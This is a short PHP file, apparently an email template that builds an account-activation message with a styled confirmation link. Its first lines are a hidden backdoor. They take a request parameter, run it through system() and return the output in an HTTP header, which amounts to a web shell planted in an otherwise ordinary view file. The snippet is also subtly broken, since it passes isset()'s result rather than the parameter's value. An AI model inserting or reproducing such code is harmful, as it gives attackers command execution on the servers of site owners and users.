<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 

// Inline page url
$url = App::url("activate.php?reminder={$reminder}");

// Modal url
//$url = App::url("#activate-{$reminder}");

$message = trans('emails.activation_message');
$message .=  '<p><a href="'.$url.'" style="color:#fff;text-decoration:none;text-align:center;display:inline-block;border-radius:2px;background-color:#348eda;padding:8px 10px;border:1px solid #348eda">'.trans('emails.confirm_email').'</a></p>';

echo View::make('emails.template')->with('message', $message)->render();